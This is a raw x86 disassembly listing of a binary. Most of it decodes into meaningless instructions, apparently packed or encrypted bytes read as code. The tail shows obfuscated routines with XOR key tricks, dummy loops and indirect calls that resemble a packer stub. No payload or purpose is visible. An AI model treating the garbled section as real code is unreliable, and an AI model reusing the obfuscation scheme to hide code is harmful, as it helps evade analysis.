  405a88:	in     al,dx
  405a89:	icebp  
  405a8a:	push   es
  405a8b:	pop    esp
  405a8c:	in     eax,0x9a
  405a8e:	cmp    edx,DWORD PTR [ebp-0x3a]
  405a91:	mov    edi,ds
  405a93:	shl    DWORD PTR [eax],1
  405a95:	push   ds
  405a96:	jecxz  0x405b0e
  405a98:	cs std 
  405a9a:	pop    es
  405a9b:	mov    ds:0x1adbc7b0,al
  405aa0:	cdq    
  405aa1:	out    dx,eax
  405aa2:	xchg   edx,eax
  405aa3:	mov    WORD PTR [ecx+ecx*2-0x13bc1b59],?
  405aaa:	jne    0x405af9
  405aac:	out    dx,al
  405aad:	mov    ebp,DWORD PTR [edx+ecx*4]
  405ab0:	add    dh,bl
  405ab2:	test   al,0x6a
  405ab4:	push   esp
  405ab5:	adc    BYTE PTR [esi+esi*8],0xe6
  405ab9:	push   eax
  405aba:	inc    edx
  405abb:	ins    DWORD PTR es:[edi],dx
  405abc:	push   ebp
  405abd:	cmp    eax,0xa8febf0a
  405ac2:	pop    esp
  405ac3:	adc    eax,0xf5371177
  405ac8:	fld    QWORD PTR [ebx]
  405aca:	popa   
  405acb:	add    ah,ch
  405acd:	mov    bh,0x82
  405acf:	in     eax,dx
  405ad0:	cdq    
  405ad1:	in     al,dx
  405ad2:	fimul  WORD PTR ds:0x27acdf2e
  405ad8:	repz imul bp,WORD PTR cs:[ebp+0x98858b3],0x58
  405ae2:	and    edx,ebp
  405ae4:	popa   
  405ae5:	add    dl,bh
  405ae7:	and    eax,0xb75c5432
  405aec:	std    
  405aed:	adc    edi,DWORD PTR [ebx+ebx*2-0x3e4445]
  405af4:	push   ds
  405af5:	jne    0x405abf
  405af7:	push   ebx
  405af8:	sub    BYTE PTR [esi+0x324fa87d],bh
  405afe:	adc    ebp,DWORD PTR [eax]
  405b00:	push   DWORD PTR [esi+0xd234c0a]
  405b06:	ins    DWORD PTR es:[edi],dx
  405b07:	push   esi
  405b08:	pop    esp
  405b09:	adc    al,0x3
  405b0b:	imul   esi,esi,0xffffffe4
  405b0e:	aam    0x98
  405b10:	mov    bl,0xc9
  405b12:	fnstsw WORD PTR [esi-0x4b]
  405b15:	jecxz  0x405b45
  405b17:	js     0x405b5f
  405b19:	xchg   ebx,eax
  405b1a:	into   
  405b1b:	lock mov edi,0x5021ed26
  405b21:	mov    bl,0x8c
  405b23:	sahf   
  405b24:	cmp    dl,bl
  405b26:	(bad)  
  405b27:	jmp    0x5dcb:0x1e07e366
  405b2e:	cwde   
  405b2f:	xchg   DWORD PTR [ebx+0x4edcf100],ebx
  405b35:	cmp    al,0xde
  405b37:	mov    ecx,0xd1de40e1
  405b3c:	inc    esp
  405b3d:	(bad)  
  405b3e:	and    eax,0xd8d8ab8a
  405b43:	dec    ebp
  405b44:	adc    eax,0xdd8dbb2d
  405b49:	scas   al,BYTE PTR es:[edi]
  405b4a:	arpl   bp,cx
  405b4c:	jl     0x405b4c
  405b4e:	xor    DWORD PTR [ecx-0x349c1562],eax
  405b54:	test   eax,0xd998148
  405b59:	cwde   
  405b5a:	push   ebx
  405b5b:	scas   eax,DWORD PTR es:[edi]
  405b5c:	dec    esi
  405b5d:	xor    bl,BYTE PTR [ebp+0x5d3e5a61]
  405b63:	dec    esi
  405b64:	jo     0x405b37
  405b66:	pop    ebp
  405b67:	fdivp  st(5),st
  405b69:	inc    ebx
  405b6a:	jge    0x405bb7
  405b6c:	push   ebp
  405b6d:	mov    DWORD PTR [ecx-0x473a38cb],eax
  405b73:	push   edi
  405b74:	(bad)  
  405b76:	mov    al,0x6c
  405b78:	xchg   ecx,eax
  405b79:	push   ecx
  405b7a:	adc    al,BYTE PTR [eax]
  405b7c:	or     eax,DWORD PTR [ebx-0x8d86671]
  405b82:	out    dx,al
  405b83:	arpl   WORD PTR [edx],dx
  405b85:	std    
  405b86:	(bad)  
  405b88:	or     BYTE PTR [eax],bh
  405b8a:	add    ch,BYTE PTR [esi]
  405b8c:	or     edi,ecx
  405b8e:	out    0xdf,eax
  405b90:	xlat   BYTE PTR ds:[ebx]
  405b91:	outs   dx,BYTE PTR ds:[esi]
  405b92:	cmp    al,0x21
  405b94:	pop    edi
  405b95:	int3   
  405b96:	push   cs
  405b97:	enter  0x53a6,0x92
  405b9b:	inc    eax
  405b9c:	std    
  405b9d:	leave  
  405b9e:	jmp    0x198a17ba
  405ba3:	mov    ch,0xd4
  405ba5:	icebp  
  405ba6:	jle    0x405b56
  405ba8:	push   ecx
  405ba9:	and    al,0xb3
  405bab:	loop   0x405bc4
  405bad:	adc    al,0x9b
  405baf:	or     dh,BYTE PTR [ebx]
  405bb1:	fwait
  405bb2:	out    dx,eax
  405bb3:	and    DWORD PTR [ebp+0x14acd94b],ecx
  405bb9:	ds add al,0x27
  405bbc:	(bad)  
  405bbd:	imul   eax,esp,0x8ffbe58b
  405bc3:	es push ecx
  405bc5:	push   es
  405bc6:	popa   
  405bc7:	or     DWORD PTR [eax-0x45],ecx
  405bca:	fistp  DWORD PTR [eax+0x4]
  405bce:	push   edx
  405bcf:	jns    0x405bd1
  405bd1:	and    bh,0x4e
  405bd4:	dec    ebp
  405bd5:	jno    0x405c21
  405bd7:	stos   BYTE PTR es:[edi],al
  405bd8:	push   ebx
  405bd9:	adc    al,0xb1
  405bdb:	ds mov al,0xbb
  405bde:	icebp  
  405bdf:	iret   
  405be0:	into   
  405be1:	xor    BYTE PTR [ebx-0x6bbda217],cl
  405be7:	fwait
  405be8:	dec    ebp
  405be9:	clc    
  405bea:	test   eax,0xc729a43a
  405bef:	adc    bh,0x3e
  405bf2:	addr16 xor al,0x64
  405bf5:	and    eax,0x2102b947
  405bfa:	xor    al,0x5f
  405bfc:	retf   0xf352
  405bff:	ja     0x405bcb
  405c01:	dec    eax
  405c02:	jmp    0xe5c0:0x11ca1c69
  405c09:	add    eax,0x117ba418
  405c0e:	les    edx,FWORD PTR [edi]
  405c10:	dec    ebx
  405c11:	je     0x405c6d
  405c13:	popa   
  405c14:	sbb    ebp,DWORD PTR [ebp+ebx*4-0x1bd0037f]
  405c1b:	mov    eax,0x987eefa4
  405c20:	push   edi
  405c21:	pushf  
  405c22:	ss (bad) 
  405c24:	push   esi
  405c25:	in     al,dx
  405c26:	xor    BYTE PTR [ebp-0x49],cl
  405c29:	and    DWORD PTR [ecx-0x28c6557e],esp
  405c2f:	push   ds
  405c30:	std    
  405c31:	mov    esp,0xbe3abdba
  405c36:	lods   eax,DWORD PTR ds:[esi]
  405c37:	out    0xa3,al
  405c39:	data16 and al,0x3c
  405c3c:	cdq    
  405c3d:	inc    eax
  405c3e:	fmul   DWORD PTR [esi]
  405c40:	add    BYTE PTR [ebx],bh
  405c42:	les    esi,FWORD PTR [edx+0x3a051ac2]
  405c48:	std    
  405c49:	mov    bh,0x9
  405c4b:	fs sub eax,0x93946790
  405c51:	add    eax,0x69283c1a
  405c56:	int3   
  405c57:	js     0x405c1a
  405c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c5a:	dec    eax
  405c5b:	and    BYTE PTR [edi+0x7896b963],dl
  405c61:	inc    esi
  405c62:	fld    TBYTE PTR [edi-0x2d]
  405c65:	push   edx
  405c66:	add    DWORD PTR [edx],ebp
  405c68:	inc    esp
  405c69:	mov    ah,0xbd
  405c6b:	sub    eax,0x61915056
  405c70:	dec    eax
  405c71:	aaa    
  405c72:	sub    dh,BYTE PTR [edx+eiz*1+0x13]
  405c76:	or     eax,DWORD PTR [edx+0x42d0e340]
  405c7c:	cmp    dl,BYTE PTR [edx]
  405c7e:	rcl    DWORD PTR [edx+ebx*4],cl
  405c81:	jnp    0x405c5a
  405c83:	loope  0x405c17
  405c85:	cli    
  405c86:	cmp    DWORD PTR [eax],ebx
  405c88:	test   al,0x4e
  405c8a:	xor    dh,cl
  405c8c:	mov    eax,ds:0x5e2c6516
  405c91:	push   esp
  405c92:	int3   
  405c93:	xlat   BYTE PTR ds:[ebx]
  405c94:	xchg   ebp,eax
  405c95:	popf   
  405c96:	ret    0xbeb0
  405c99:	add    edi,DWORD PTR [eax-0x39]
  405c9c:	adc    eax,0x97cb30e0
  405ca1:	jg     0x405c40
  405ca3:	in     al,dx
  405ca4:	loope  0x405d11
  405ca6:	mov    edx,0x3b22239c
  405cab:	and    ah,BYTE PTR [eax+0x0]
  405cae:	lock js 0x405cee
  405cb1:	xchg   ebp,eax
  405cb2:	push   cs
  405cb3:	inc    esp
  405cb4:	jb     0x405cf4
  405cb6:	sbb    al,0xd7
  405cb8:	inc    eax
  405cb9:	mul    BYTE PTR [ecx+0x64]
  405cbc:	cmp    DWORD PTR [esi-0xc],ebx
  405cbf:	cwde   
  405cc0:	in     al,0x35
  405cc2:	mov    ebx,0xed563638
  405cc7:	stc    
  405cc8:	sub    al,0x54
  405cca:	int    0x8b
  405ccc:	xor    DWORD PTR [ecx-0x18],esi
  405ccf:	or     DWORD PTR ds:0x367ec2bc,ebx
  405cd5:	ds jnp 0x405d3e
  405cd8:	(bad)  
  405cd9:	push   cs
  405cda:	into   
  405cdb:	mov    bl,0x0
  405cdd:	dec    esi
  405cde:	stc    
  405cdf:	mov    al,dh
  405ce1:	leave  
  405ce2:	das    
  405ce3:	mov    ah,0x2f
  405ce5:	xor    ch,0xef
  405ce8:	and    ecx,DWORD PTR [ebx+0x4db6a7da]
  405cee:	dec    ecx
  405cef:	(bad)  
  405cf1:	and    ch,BYTE PTR [ebx+eiz*1+0x5334ea01]
  405cf8:	push   ebp
  405cf9:	inc    dh
  405cfb:	repz in al,0x88
  405cfe:	shr    esi,1
  405d00:	dec    eax
  405d01:	sbb    DWORD PTR [edi-0x4e],ebx
  405d04:	cmp    bl,BYTE PTR [ebx-0x4a]
  405d07:	push   ss
  405d08:	(bad)  
  405d09:	bound  ebp,QWORD PTR [ecx]
  405d0b:	jo     0x405d23
  405d0d:	int    0xc0
  405d0f:	push   cs
  405d10:	dec    esp
  405d11:	shl    DWORD PTR [ecx-0x13],1
  405d14:	lods   eax,DWORD PTR ds:[esi]
  405d15:	dec    ebx
  405d16:	loope  0x405d75
  405d18:	adc    dl,bl
  405d1a:	add    cl,bl
  405d1c:	pop    ecx
  405d1d:	test   al,0xc0
  405d1f:	xchg   DWORD PTR [esi],esp
  405d21:	imul   ecx,ebp,0xfffffff2
  405d24:	ror    bh,0xc0
  405d27:	aaa    
  405d28:	shl    BYTE PTR [ebx+0x1],0x47
  405d2c:	sub    ch,dh
  405d2e:	adc    dh,bh
  405d30:	call   0xb2aa:0xab77fe1c
  405d37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d38:	sbb    al,0x3b
  405d3a:	cmc    
  405d3b:	(bad)  
  405d3c:	push   ebx
  405d3d:	dec    esp
  405d3e:	aam    0x64
  405d40:	cmp    ax,0x2efd
  405d44:	mov    eax,ds:0x6e529d6d
  405d49:	add    ebx,DWORD PTR [edi+0x214bcc6c]
  405d4f:	fiadd  DWORD PTR [edx+0x62a4f71f]
  405d55:	pop    eax
  405d56:	jbe    0x405d74
  405d58:	jl     0x405d78
  405d5a:	test   BYTE PTR [ebp-0xf4f248b],ch
  405d60:	dec    ebp
  405d61:	xchg   esp,eax
  405d62:	cmp    BYTE PTR [edx+0x3c3f22e9],dh
  405d68:	out    0xbd,eax
  405d6a:	pop    edi
  405d6b:	jns    0x405d2c
  405d6d:	sub    al,0xc4
  405d6f:	nop
  405d70:	xchg   edi,eax
  405d71:	stc    
  405d72:	inc    edi
  405d73:	(bad)  
  405d74:	jmp    0x2040102b
  405d79:	adc    ch,ch
  405d7b:	jg     0x405d2b
  405d7d:	sbb    BYTE PTR [edx-0x6f],0x77
  405d81:	push   cs
  405d82:	push   0x49
  405d84:	sbb    eax,0xc657d0bd
  405d89:	push   es
  405d8a:	inc    ebx
  405d8b:	push   ebp
  405d8c:	sub    BYTE PTR [esi+eiz*1+0x6f],dh
  405d90:	pop    esi
  405d91:	mov    eax,ds:0x8dea6350
  405d96:	dec    edi
  405d97:	dec    ebp
  405d98:	jle    0x405dfe
  405d9a:	dec    esi
  405d9b:	scas   al,BYTE PTR es:[edi]
  405d9c:	fisubr DWORD PTR [esi+0x17]
  405d9f:	inc    esi
  405da0:	jo     0x405df1
  405da2:	adc    edx,edx
  405da4:	cdq    
  405da5:	and    DWORD PTR [eax+ecx*4-0x14],0x72
  405daa:	sbb    al,0xc8
  405dac:	push   ebx
  405dad:	xor    edi,DWORD PTR [esi-0x33]
  405db0:	xor    al,0x5f
  405db2:	cdq    
  405db3:	pop    ss
  405db4:	neg    BYTE PTR [edi-0x226b4ff9]
  405dba:	jne    0x405e32
  405dbc:	lea    ebx,[ecx+0x4c]
  405dbf:	mov    ds:0x47157870,al
  405dc4:	test   eax,0xa97231be
  405dc9:	mov    esp,0x6c26496a
  405dce:	aad    0x4e
  405dd0:	push   ebx
  405dd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405dd2:	inc    ebp
  405dd3:	cld    
  405dd4:	arpl   WORD PTR [ecx+0x5f7f9fd7],si
  405dda:	push   ebp
  405ddb:	enter  0x8bc,0x8e
  405ddf:	sub    eax,0x985a57e3
  405de4:	or     eax,0xa73982bb
  405de9:	jno    0x405dbf
  405deb:	push   edi
  405dec:	icebp  
  405ded:	adc    bh,BYTE PTR ds:0x91607d19
  405df3:	icebp  
  405df4:	adc    eax,0xbb6bc183
  405df9:	mov    edi,0x54b806a0
  405dfe:	dec    ecx
  405dff:	imul   eax,DWORD PTR [edx+0x28fb8740],0x1b
  405e06:	fdivr  st(2),st
  405e08:	adc    ah,0x60
  405e0b:	sti    
  405e0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e0d:	mov    WORD PTR [ebp+0x2e],cs
  405e10:	sub    DWORD PTR [ebx+0xee722ae],ecx
  405e16:	fwait
  405e17:	(bad)  
  405e18:	in     eax,dx
  405e19:	rol    DWORD PTR [esi+0x56],0x7a
  405e1d:	jge    0x405e9e
  405e1f:	jnp    0x405e21
  405e21:	scas   al,BYTE PTR es:[edi]
  405e22:	jnp    0x405df1
  405e24:	arpl   WORD PTR [eax-0x2df98bad],si
  405e2a:	mov    edi,0xed287ba6
  405e2f:	mov    ds:0x218b0b7d,al
  405e34:	adc    DWORD PTR [ebx-0x33],ebp
  405e37:	add    BYTE PTR [eax+0x32],ch
  405e3a:	mov    ds,eax
  405e3c:	into   
  405e3d:	imul   bl
  405e3f:	pushf  
  405e40:	dec    eax
  405e41:	stos   BYTE PTR es:[edi],al
  405e42:	sbb    al,0x53
  405e44:	jl     0x405e89
  405e46:	mov    al,ds:0xbaf1a515
  405e4b:	ffreep st(6)
  405e4d:	inc    esi
  405e4e:	(bad)  
  405e50:	mov    dl,0x77
  405e52:	lea    edx,[eax+0x7307b7c8]
  405e58:	mov    cl,0x86
  405e5a:	jne    0x405e27
  405e5c:	ficomp WORD PTR [edx+0x4582204e]
  405e62:	pop    ebx
  405e63:	inc    edx
  405e64:	xchg   ebp,eax
  405e65:	mov    ch,0xe2
  405e67:	mov    edx,0xb0a08ae1
  405e6c:	pop    ss
  405e6d:	mov    al,0xa3
  405e6f:	mov    edx,0xff91cb40
  405e74:	int    0x8d
  405e76:	icebp  
  405e77:	pop    ebp
  405e78:	push   ebp
  405e79:	and    BYTE PTR [eax],0xa3
  405e7c:	mov    ah,BYTE PTR [eax+0x2a17b63]
  405e82:	maskmovq mm0,(bad)
  405e83:	test   DWORD PTR [ebx],0x249754a
  405e89:	push   esp
  405e8a:	xchg   BYTE PTR [edi],ah
  405e8c:	adc    esp,esi
  405e8e:	mov    edx,0xea668e05
  405e93:	arpl   WORD PTR [esi-0x46],bx
  405e96:	dec    edx
  405e97:	sbb    BYTE PTR [ecx+0x37],dl
  405e9a:	and    eax,0x6c6813ff
  405e9f:	sar    dh,1
  405ea1:	sar    BYTE PTR [ecx],1
  405ea3:	cli    
  405ea4:	push   esi
  405ea5:	out    dx,eax
  405ea6:	sbb    eax,0x749196e7
  405eab:	addr16 (bad) 
  405ead:	mov    ebx,0x93305c40
  405eb2:	sub    BYTE PTR [ecx+0x106174cf],dh
  405eb8:	inc    esp
  405eb9:	jmp    0x405f17
  405ebb:	popf   
  405ebc:	sub    BYTE PTR [ecx+0xa782cb4],dl
  405ec2:	(bad)  
  405ec3:	std    
  405ec4:	cwde   
  405ec5:	test   DWORD PTR [ecx+0x155d7e40],esp
  405ecb:	mov    DWORD PTR [edi-0x72],eax
  405ece:	pushf  
  405ecf:	jecxz  0x405ef8
  405ed1:	add    al,0x21
  405ed3:	jo     0x405f35
  405ed5:	cmp    eax,0xa0cfd783
  405eda:	push   ecx
  405edb:	call   0xd297e203
  405ee0:	enter  0x9a8,0x2
  405ee4:	ret    0xe5b7
  405ee7:	and    DWORD PTR [ebx+ebp*2-0x7a],edi
  405eeb:	cmp    eax,0xa7f4f737
  405ef0:	sub    bl,ch
  405ef2:	mov    ecx,0x1f58f983
  405ef7:	jb     0x405f65
  405ef9:	or     al,BYTE PTR [edx]
  405efb:	inc    ebx
  405efc:	dec    ebp
  405efd:	sub    al,0x78
  405eff:	cmp    BYTE PTR [ebp-0xe],ch
  405f02:	gs shr ecx,cl
  405f05:	mov    dl,0xf6
  405f07:	daa    
  405f08:	xchg   edx,eax
  405f09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f0a:	adc    ebx,DWORD PTR [ebx-0x55]
  405f0d:	lock push esi
  405f0f:	rol    BYTE PTR [edi+eax*2+0x3e],0xb1
  405f14:	fwait
  405f15:	adc    DWORD PTR [ebx-0x11],0xffffffe4
  405f19:	cmp    BYTE PTR [ecx],bh
  405f1b:	mov    cl,0x2f
  405f1d:	jnp    0x405f3f
  405f1f:	adc    ch,bl
  405f21:	jnp    0x405f4c
  405f23:	rol    bl,0x1d
  405f26:	call   0x32edd461
  405f2b:	jl     0x405ef0
  405f2d:	xchg   esi,eax
  405f2e:	ins    DWORD PTR es:[edi],dx
  405f2f:	sub    DWORD PTR [ebx-0x66],0x8a033828
  405f36:	sbb    al,0x9c
  405f38:	sar    ecx,cl
  405f3a:	cmp    al,0x9
  405f3c:	pop    esp
  405f3d:	repz cmp DWORD PTR [ebp+ebx*8+0x4721f942],ebp
  405f45:	cmp    DWORD PTR ds:0x50270990,ebx
  405f4b:	popf   
  405f4c:	shufps xmm2,XMMWORD PTR [ebp+0x7e],0x8c
  405f51:	dec    eax
  405f52:	or     dh,bh
  405f54:	and    eax,0xa2b6e814
  405f59:	dec    edi
  405f5a:	ret    
  405f5b:	push   esp
  405f5c:	cli    
  405f5d:	sbb    al,0xd6
  405f5f:	jl     0x405fda
  405f61:	shl    al,0xc2
  405f64:	inc    esi
  405f65:	xor    bl,BYTE PTR [edx-0xe1e666a]
  405f6b:	or     esi,DWORD PTR [esi-0x70ba5b0e]
  405f71:	mov    ds:0x131640c6,al
  405f76:	sbb    BYTE PTR [ecx],ch
  405f78:	and    ah,BYTE PTR [edi-0x2c]
  405f7b:	test   al,0xa1
  405f7d:	leave  
  405f7e:	inc    ebx
  405f7f:	pop    esi
  405f80:	jg     0x405f28
  405f82:	outs   dx,DWORD PTR ds:[esi]
  405f83:	(bad)  
  405f84:	fwait
  405f85:	xchg   ebx,eax
  405f86:	sub    DWORD PTR [esi-0x7166da0a],edx
  405f8c:	aam    0x3c
  405f8e:	ss ins BYTE PTR es:[edi],dx
  405f90:	in     al,0xb4
  405f92:	adc    BYTE PTR [ebx+ebp*8],0xba
  405f96:	sub    al,0xb5
  405f98:	ss mov edx,0x8bbb67e8
  405f9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f9f:	stos   BYTE PTR es:[edi],al
  405fa0:	or     DWORD PTR [ecx+0x58511e24],0xb8ef650
  405faa:	out    0x91,eax
  405fac:	jecxz  0x405f57
  405fae:	and    ebx,DWORD PTR [edx]
  405fb0:	inc    esi
  405fb1:	adc    al,BYTE PTR [ecx+0x11]
  405fb4:	jmp    0x98e00d84
  405fb9:	mov    ecx,0x315a7d9b
  405fbe:	scas   al,BYTE PTR es:[edi]
  405fbf:	cmp    BYTE PTR [edi],dh
  405fc1:	rcl    bh,0xf1
  405fc4:	pop    eax
  405fc5:	sbb    eax,0xd75cef68
  405fca:	pop    edi
  405fcb:	call   0xc690:0xa5a5e6c6
  405fd2:	ret    
  405fd3:	lods   eax,DWORD PTR ds:[esi]
  405fd4:	(bad)  
  405fd5:	cld    
  405fd6:	push   cs
  405fd7:	lea    ebp,[edx-0x22]
  405fda:	cmp    al,0x21
  405fdc:	jmp    0x406050
  405fde:	outs   dx,DWORD PTR gs:[esi]
  405fe0:	sbb    bh,BYTE PTR [edi-0x7cf725d3]
  405fe6:	cli    
  405fe7:	or     BYTE PTR [edx+0x4d],0x1d
  405feb:	jns    0x406017
  405fed:	(bad)  
  405fee:	mov    edx,0xfde0be8d
  405ff3:	xchg   edi,eax
  405ff4:	xchg   ebp,eax
  405ff5:	(bad)  [ebp+0x2ba4e89b]
  405ffb:	mov    ch,0x6d
  405ffd:	jb     0x406034
  405fff:	mov    al,ds:0xa860b58
  406004:	mov    al,BYTE PTR [eax-0x6d]
  406007:	push   edi
  406008:	int3   
  406009:	or     DWORD PTR [eax],0xb6355e6e
  40600f:	mov    edx,0xf5ec24af
  406014:	xlat   BYTE PTR ds:[ebx]
  406015:	cwde   
  406016:	popa   
  406017:	lods   eax,DWORD PTR ds:[esi]
  406018:	push   ebp
  406019:	pop    ecx
  40601a:	or     DWORD PTR [eax],ecx
  40601c:	jo     0x405fc7
  40601e:	imul   esi,DWORD PTR [ecx],0xa518dc17
  406024:	aas    
  406025:	icebp  
  406026:	es (bad) 
  406028:	call   0xd8b5e78b
  40602d:	jmp    0x102:0x3c865932
  406034:	gs inc eax
  406036:	int    0xc7
  406038:	pop    ds
  406039:	pop    esi
  40603a:	xor    cl,BYTE PTR [eax]
  40603c:	dec    ecx
  40603d:	or     bh,0x51
  406040:	data16 and ch,BYTE PTR [ebx+0x38e420d4]
  406047:	jmp    0x2d29:0x66b23011
  40604e:	and    DWORD PTR [ecx],esi
  406050:	rcl    ebp,cl
  406052:	scas   eax,DWORD PTR es:[edi]
  406053:	jmp    0x40607c
  406055:	sbb    DWORD PTR [esi],eax
  406057:	and    al,dh
  406059:	mov    al,0x8c
  40605b:	adc    eax,0xe5f3a332
  406060:	out    dx,al
  406061:	in     al,dx
  406062:	jl     0x4060dc
  406064:	mov    bh,0xba
  406066:	jle    0x4060ae
  406068:	jnp    0x406031
  40606a:	add    eax,esi
  40606c:	out    0xe3,eax
  40606e:	in     eax,dx
  40606f:	jg     0x406092
  406071:	jne    0x406013
  406073:	push   edi
  406074:	pop    ecx
  406075:	mov    DWORD PTR ds:0xa7143ec4,edx
  40607b:	cmp    al,0x72
  40607d:	icebp  
  40607e:	mov    al,ds:0x5b25eb22
  406083:	outs   dx,BYTE PTR ds:[si]
  406085:	push   ebx
  406086:	add    dl,dl
  406088:	loop   0x40600f
  40608a:	fst    DWORD PTR [esi+ebx*4+0x7cba1667]
  406091:	inc    esp
  406092:	and    BYTE PTR [edx+ebx*4+0xfd8943e],ch
  406099:	int3   
  40609a:	sbb    DWORD PTR [ecx+ebx*4+0x64],ecx
  40609e:	repnz shl BYTE PTR [ebx],0x47
  4060a2:	adc    eax,DWORD PTR [esi-0x61e060dc]
  4060a8:	js     0x406036
  4060aa:	push   esi
  4060ab:	call   0x31acfdbc
  4060b0:	std    
  4060b1:	push   ebx
  4060b2:	push   ss
  4060b3:	pop    ss
  4060b4:	mov    esp,DWORD PTR [esp+edi*8-0x66]
  4060b8:	std    
  4060b9:	pop    ebx
  4060ba:	mov    ?,edi
  4060bc:	inc    edi
  4060bd:	out    dx,al
  4060be:	mov    ch,0x7
  4060c0:	add    al,BYTE PTR [ebp+0xd]
  4060c3:	cmp    edx,0x99ab5853
  4060c9:	adc    edi,DWORD PTR [ebp-0xb]
  4060cc:	pavgw  mm2,QWORD PTR [eax-0x1b]
  4060d0:	and    cl,ah
  4060d2:	es cld 
  4060d4:	ficom  DWORD PTR [ebp-0x67]
  4060d7:	sub    ebx,DWORD PTR [esi+0x5a]
  4060da:	mov    eax,ds:0xb5301a1
  4060df:	adc    al,0x85
  4060e1:	cmp    DWORD PTR [eax-0x2f72c3f2],edi
  4060e7:	les    esi,FWORD PTR es:[eax-0x67]
  4060eb:	and    BYTE PTR [eax],bh
  4060ed:	cmp    al,0x94
  4060ef:	neg    al
  4060f1:	pop    ds
  4060f2:	shl    al,1
  4060f4:	xchg   ebp,eax
  4060f5:	iret   
  4060f6:	push   edi
  4060f7:	(bad)  
  4060f9:	cs add eax,0x73e5e984
  4060ff:	es retf 
  406101:	ds (bad) 
  406106:	mov    ds:0x8b1a0488,eax
  40610b:	inc    ebp
  40610c:	ror    BYTE PTR [ebx-0x39cc27ab],0x33
  406113:	(bad)  
  406114:	add    eax,edi
  406116:	add    edx,edi
  406118:	imul   eax,edx
  40611b:	add    eax,DWORD PTR [ebp-0xc]
  40611e:	mov    DWORD PTR [ebp-0xc],eax
  406121:	mov    eax,DWORD PTR [ebp-0xc]
  406124:	mov    edx,DWORD PTR [ebp-0x18]
  406127:	cmp    edx,eax
  406129:	jb     0x403ce7
  40612f:	mov    eax,DWORD PTR [ebp-0x28]
  406132:	mov    edx,DWORD PTR [ebp-0x18]
  406135:	xor    eax,esi
  406137:	add    eax,edi
  406139:	imul   eax,edx
  40613c:	mov    edx,DWORD PTR [ebp-0x1c]
  40613f:	xor    edx,esi
  406141:	add    edx,edi
  406143:	or     eax,edx
  406145:	mov    edx,DWORD PTR [ebp-0x20]
  406148:	xor    edx,esi
  40614a:	add    eax,edx
  40614c:	mov    edx,DWORD PTR [ebp-0x20]
  40614f:	xor    edx,esi
  406151:	add    eax,edx
  406153:	mov    edx,DWORD PTR [ebp-0x10]
  406156:	lea    eax,[eax+edx*1+0x64e5ea]
  40615d:	jmp    0x406171
  406162:	mov    eax,DWORD PTR [ebp-0x20]
  406165:	mov    edx,DWORD PTR [ebp-0x10]
  406168:	xor    eax,esi
  40616a:	lea    eax,[eax+edx*1+0x3272f5]
  406171:	mov    DWORD PTR [ebp-0x10],eax
  406174:	jmp    0x403c34
  406179:	mov    ebx,DWORD PTR [ebp-0x3c]
  40617c:	mov    eax,DWORD PTR [ebp+0xc]
  40617f:	xor    eax,esi
  406181:	lea    ecx,[ecx+eax*1+0x3272f5]
  406188:	lea    eax,[ecx-0x3272f5]
  40618e:	xor    eax,esi
  406190:	cmp    eax,0xf89c95a5
  406195:	jne    0x401883
  40619b:	dec    DWORD PTR [ebp-0x34]
  40619e:	jne    0x401877
  4061a4:	mov    eax,DWORD PTR [ebp+0x8]
  4061a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4061aa:	mov    edx,DWORD PTR [ebp+0x8]
  4061ad:	xor    ecx,esi
  4061af:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f5]
  4061b6:	xor    eax,esi
  4061b8:	mov    al,BYTE PTR [eax+ebx*1+0x3272f5]
  4061bf:	xor    edx,esi
  4061c1:	mov    BYTE PTR [edx+ebx*1+0x3272f5],cl
  4061c8:	mov    ecx,DWORD PTR [ebp+0xc]
  4061cb:	xor    ecx,esi
  4061cd:	mov    BYTE PTR [ecx+ebx*1+0x3272f5],al
  4061d4:	mov    eax,DWORD PTR [ebp+0xc]
  4061d7:	xor    eax,esi
  4061d9:	add    eax,edi
  4061db:	pop    edi
  4061dc:	pop    esi
  4061dd:	pop    ebx
  4061de:	leave  
  4061df:	ret    0x8
  4061e2:	sbb    DWORD PTR ds:0x42b226,0x2deb
  4061ec:	xor    eax,eax
  4061ee:	sbb    DWORD PTR ds:0x42b1ce,0x42b18a
  4061f8:	inc    eax
  4061f9:	ret    
  4061fa:	push   ebp
  4061fb:	mov    ebp,esp
  4061fd:	sub    esp,0x38
  406200:	and    DWORD PTR ds:0x42b22a,0x0
  40620a:	mov    eax,ds:0x42b22a
  40620f:	inc    eax
  406210:	mov    ds:0x42b22a,eax
  406215:	cmp    DWORD PTR ds:0x42b22a,0x14
  40621c:	jbe    0x40624e
  406222:	jmp    0x406241
  406227:	push   0x42b216
  40622c:	push   0x1051
  406231:	push   0x42a251
  406236:	push   0x42a000
  40623b:	call   DWORD PTR ds:0x42b31e
  406241:	cmp    DWORD PTR ds:0x42b22a,0x12
  406248:	jb     0x40620a
  40624e:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  406255:	push   ebx
  406256:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  40625d:	mov    eax,DWORD PTR [ebp-0x4]
  406260:	push   esi
  406261:	and    DWORD PTR ds:0x42b22a,0x0
  40626b:	mov    esi,DWORD PTR ds:0x42b22a
  406271:	inc    esi
  406272:	mov    DWORD PTR ds:0x42b22a,esi
  406278:	cmp    DWORD PTR ds:0x42b22a,0x26
  40627f:	jbe    0x4062a0
  406285:	jmp    0x406293
  40628a:	push   DWORD PTR [ebp-0x1c]
  40628d:	call   DWORD PTR ds:0x42b322
  406293:	cmp    DWORD PTR ds:0x42b22a,0x16
  40629a:	jb     0x40626b
  4062a0:	mov    esi,0x75108ae
  4062a5:	or     DWORD PTR ds:0x42b1aa,0x42b19e
  4062af:	xor    eax,esi
  4062b1:	sub    DWORD PTR ds:0x42b1da,0x3dfa
  4062bb:	push   edi
  4062bc:	add    DWORD PTR ds:0x42b1ea,0x4970
  4062c6:	mov    edi,0x3272f5
  4062cb:	and    DWORD PTR ds:0x42b1ea,0x42b1d6
  4062d5:	add    eax,edi
  4062d7:	mov    DWORD PTR [ebp-0x1c],eax
  4062da:	mov    eax,DWORD PTR [ebp+0x14]
  4062dd:	add    DWORD PTR ds:0x42b22a,0x5e0e
